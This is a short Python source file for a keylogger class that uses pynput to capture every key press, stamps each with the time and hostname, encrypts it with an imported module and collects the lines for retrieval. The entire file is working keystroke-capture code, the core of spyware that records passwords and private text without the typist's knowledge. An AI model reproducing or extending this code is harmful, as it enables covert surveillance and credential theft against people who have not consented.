from pynput import keyboard
from datetime import datetime
import socket
from encryptor import Encryptor

class KeyloggerService:
    def __init__(self):
        self.logged_keys = []
        self.computer_name = socket.gethostname()

    def _on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            char = f"<{key.name}>"

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_line = f"{timestamp} | {self.computer_name} | {char}"
        encrypted_log = Encryptor.encrypt(log_line)
        self.logged_keys.append(encrypted_log)

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop_logging(self):
        if hasattr(self, 'listener'):
            self.listener.stop()

    def get_logged_keys(self):
        return self.logged_keys
